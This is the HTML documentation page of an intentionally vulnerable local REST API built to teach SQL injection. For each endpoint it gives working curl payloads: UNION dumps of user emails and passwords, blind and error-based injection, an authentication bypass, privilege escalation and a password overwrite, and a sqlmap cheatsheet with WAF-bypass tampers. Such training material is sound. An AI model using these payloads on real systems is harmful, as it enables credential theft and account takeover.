<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Vulnerable API Docs | SQLi Demo</title>
  <link href="../bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <script src="../bootstrap/js/bootstrap.bundle.min.js"></script>
  <style>
    .method-get    { background: #198754; color: #fff; }
    .method-post   { background: #0d6efd; color: #fff; }
    .method-put    { background: #fd7e14; color: #fff; }
    .endpoint-card { border-left: 4px solid #dc3545; }
    pre { background: #1e1e1e; color: #d4d4d4; padding: 1rem; border-radius: 6px; font-size: .8rem; }
  </style>
</head>
<body class="bg-light">

<nav class="navbar navbar-dark bg-dark">
  <div class="container">
    <a class="navbar-brand" href="../index.php">← SQLi Demo</a>
    <span class="navbar-text text-danger fw-bold">⚠️ Vulnerable API — For Educational Use Only</span>
  </div>
</nav>

<div class="container py-5">

  <div class="d-flex align-items-center gap-3 mb-2">
    <h1 class="mb-0">Vulnerable REST API</h1>
    <span class="badge bg-danger fs-6">INTENTIONALLY INSECURE</span>
  </div>
  <p class="text-muted mb-4">Base URL: <code>http://localhost:8080/api/</code> &nbsp;|&nbsp; All endpoints are vulnerable to SQL injection in various ways.</p>

  <div class="alert alert-danger mb-5">
    <strong>⚠️ Every endpoint below contains intentional SQL injection vulnerabilities.</strong>
    They expose raw SQL queries and errors in responses to make learning easier.
    All injection types: GET params, POST JSON body, HTTP headers, ORDER BY, LIKE, LIMIT clauses.
  </div>

  <!-- Endpoint 1: GET /api/users.php -->
  <div class="card mb-4 endpoint-card">
    <div class="card-header bg-dark text-white d-flex align-items-center gap-2">
      <span class="badge method-get px-2 py-1">GET</span>
      <code>/api/users.php</code>
      <span class="ms-auto badge bg-danger">Integer + String + ORDER BY + LIKE injection</span>
    </div>
    <div class="card-body">
      <h6>Parameters</h6>
      <table class="table table-sm table-bordered small">
        <thead class="table-secondary"><tr><th>Param</th><th>Type</th><th>Vulnerability</th></tr></thead>
        <tbody>
          <tr><td><code>id</code></td><td>integer</td><td>Raw integer in WHERE clause — UNION / error-based / blind</td></tr>
          <tr><td><code>role</code></td><td>string</td><td>String in WHERE account_type — tautology bypass</td></tr>
          <tr><td><code>search</code></td><td>string</td><td>LIKE injection — UNION possible</td></tr>
          <tr><td><code>sort</code></td><td>string</td><td>ORDER BY injection — column enumeration, blind via error</td></tr>
        </tbody>
      </table>

      <h6>Example Attacks</h6>
      <pre># Dump all users via UNION
curl "http://localhost:8080/api/users.php?id=1 UNION SELECT 1,email,password,account_type,5,6 FROM user--"

# Extract from secret table
curl "http://localhost:8080/api/users.php?search=%25' UNION SELECT id,name,filepath,1,1,1 FROM secret-- "

# ORDER BY injection — enumerate columns
curl "http://localhost:8080/api/users.php?sort=account_type"

# Error-based via id
curl "http://localhost:8080/api/users.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))"

# Time-based blind
curl "http://localhost:8080/api/users.php?id=1 AND SLEEP(3)"

# Boolean blind
curl "http://localhost:8080/api/users.php?id=8 AND substring(database(),1,1)='s'"

# sqlmap
sqlmap -u "http://localhost:8080/api/users.php?id=1" --dbs --batch
sqlmap -u "http://localhost:8080/api/users.php?id=1" -D sql_demo --dump --batch</pre>
    </div>
  </div>

  <!-- Endpoint 2: GET /api/search.php -->
  <div class="card mb-4 endpoint-card">
    <div class="card-header bg-dark text-white d-flex align-items-center gap-2">
      <span class="badge method-get px-2 py-1">GET</span>
      <code>/api/search.php</code>
      <span class="ms-auto badge bg-danger">LIKE + LIMIT + OFFSET injection</span>
    </div>
    <div class="card-body">
      <h6>Parameters</h6>
      <table class="table table-sm table-bordered small">
        <thead class="table-secondary"><tr><th>Param</th><th>Vulnerability</th></tr></thead>
        <tbody>
          <tr><td><code>q</code></td><td>LIKE injection in multiple columns simultaneously</td></tr>
          <tr><td><code>limit</code></td><td>Raw LIMIT clause — integer or UNION injection</td></tr>
          <tr><td><code>offset</code></td><td>Raw OFFSET clause</td></tr>
        </tbody>
      </table>

      <h6>Example Attacks</h6>
      <pre># UNION via LIKE
curl "http://localhost:8080/api/search.php?q=%25' UNION SELECT id,name,filepath,1 FROM secret-- "

# Enumerate all tables
curl "http://localhost:8080/api/search.php?q=%25' UNION SELECT table_name,column_name,1,1 FROM information_schema.columns WHERE table_schema=database()-- "

# LIMIT clause injection
curl "http://localhost:8080/api/search.php?limit=1 UNION SELECT 1,email,password,4 FROM user--"</pre>
    </div>
  </div>

  <!-- Endpoint 3: POST /api/login.php -->
  <div class="card mb-4 endpoint-card">
    <div class="card-header bg-dark text-white d-flex align-items-center gap-2">
      <span class="badge method-post px-2 py-1">POST</span>
      <code>/api/login.php</code>
      <span class="ms-auto badge bg-danger">JSON body + HTTP header injection</span>
    </div>
    <div class="card-body">
      <h6>Request Body (JSON)</h6>
      <table class="table table-sm table-bordered small">
        <thead class="table-secondary"><tr><th>Field</th><th>Vulnerability</th></tr></thead>
        <tbody>
          <tr><td><code>email</code></td><td>Raw string in WHERE — authentication bypass</td></tr>
          <tr><td><code>password</code></td><td>Raw string in WHERE</td></tr>
        </tbody>
      </table>
      <h6>HTTP Headers (also vulnerable)</h6>
      <table class="table table-sm table-bordered small">
        <thead class="table-secondary"><tr><th>Header</th><th>Vulnerability</th></tr></thead>
        <tbody>
          <tr><td><code>X-Forwarded-For</code></td><td>Injected raw into audit log INSERT query</td></tr>
        </tbody>
      </table>

      <h6>Example Attacks</h6>
      <pre># Auth bypass via JSON body
curl -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"'--","password":"x"}'

# Login as specific user (no password)
curl -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"besu@gmail.com'"'"'--","password":"x"}'

# Header injection into audit log
curl -X POST http://localhost:8080/api/login.php \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 1.1.1.1', (SELECT password FROM user LIMIT 1), NOW())--" \
  -d '{"email":"test@test.com","password":"x"}'

# sqlmap with POST data
sqlmap -u "http://localhost:8080/api/login.php" \
  --data='{"email":"test@test.com","password":"x"}' \
  --headers="Content-Type: application/json" \
  -p email --dbs --batch</pre>
    </div>
  </div>

  <!-- Endpoint 4: PUT /api/user_update.php -->
  <div class="card mb-4 endpoint-card">
    <div class="card-header bg-dark text-white d-flex align-items-center gap-2">
      <span class="badge method-put px-2 py-1">PUT</span>
      <code>/api/user_update.php</code>
      <span class="ms-auto badge bg-danger">UPDATE injection + mass assignment</span>
    </div>
    <div class="card-body">
      <h6>Request Body (JSON)</h6>
      <table class="table table-sm table-bordered small">
        <thead class="table-secondary"><tr><th>Field</th><th>Vulnerability</th></tr></thead>
        <tbody>
          <tr><td><code>firstname</code></td><td>Raw string in SET clause — inject extra columns</td></tr>
          <tr><td><code>account_type</code></td><td>Mass assignment — send this field to escalate privileges</td></tr>
          <tr><td><code>id</code></td><td>Raw integer in WHERE — change target user</td></tr>
        </tbody>
      </table>

      <h6>Example Attacks</h6>
      <pre># Privilege escalation via SET injection
curl -X PUT http://localhost:8080/api/user_update.php \
  -H "Content-Type: application/json" \
  -d '{"id":1,"firstname":"x'"'"', account_type='"'"'admin'"'"' WHERE id=1--","lastname":"y"}'

# Mass assignment (just send the field)
curl -X PUT http://localhost:8080/api/user_update.php \
  -H "Content-Type: application/json" \
  -d '{"id":1,"firstname":"John","lastname":"Doe","account_type":"admin"}'

# Inject second UPDATE for another user
curl -X PUT http://localhost:8080/api/user_update.php \
  -H "Content-Type: application/json" \
  -d '{"id":1,"firstname":"x'"'"'; UPDATE user SET password='"'"'hacked'"'"' WHERE id=8--","lastname":"y"}'</pre>
    </div>
  </div>

  <!-- Quick Test -->
  <div class="card mb-4">
    <div class="card-header bg-secondary text-white"><strong>Quick Test — Browser Links</strong></div>
    <div class="card-body">
      <div class="list-group list-group-flush">
        <a href="users.php" class="list-group-item list-group-item-action">GET /api/users.php — all users</a>
        <a href="users.php?id=8" class="list-group-item list-group-item-action">GET /api/users.php?id=8 — single user</a>
        <a href="users.php?sort=account_type" class="list-group-item list-group-item-action">GET /api/users.php?sort=account_type — ORDER BY test</a>
        <a href="search.php?q=a" class="list-group-item list-group-item-action">GET /api/search.php?q=a — search</a>
        <a href="users.php?id=1 AND extractvalue(1,concat(0x7e,(SELECT version())))" class="list-group-item list-group-item-action text-danger">GET /api/users.php?id=error-based — (error-based attack)</a>
        <a href="users.php?id=1 AND SLEEP(2)" class="list-group-item list-group-item-action text-danger">GET /api/users.php?id=time-based — (time-based attack, 2s delay)</a>
      </div>
    </div>
  </div>

  <!-- sqlmap cheatsheet -->
  <div class="card">
    <div class="card-header bg-dark text-white"><strong>sqlmap Cheatsheet for This API</strong></div>
    <div class="card-body">
      <pre># Detect and enumerate all databases
sqlmap -u "http://localhost:8080/api/users.php?id=1" --dbs --batch

# Dump the sql_demo database
sqlmap -u "http://localhost:8080/api/users.php?id=1" -D sql_demo --dump --batch

# Test all parameters
sqlmap -u "http://localhost:8080/api/users.php?id=1&role=user&sort=id" --dbs --batch --level=3

# Test POST with JSON (login endpoint)
sqlmap -u "http://localhost:8080/api/login.php" \
  --data='{"email":"test@test.com","password":"x"}' \
  --headers="Content-Type: application/json" -p email --dbs --batch

# Test with all techniques
sqlmap -u "http://localhost:8080/api/users.php?id=1" \
  --technique=BESTU --level=3 --risk=2 --dump --batch

# WAF bypass tamper
sqlmap -u "http://localhost:8080/api/users.php?id=1" \
  --tamper=space2comment,randomcase --dbs --batch</pre>
    </div>
  </div>

</div>
</body>
</html>
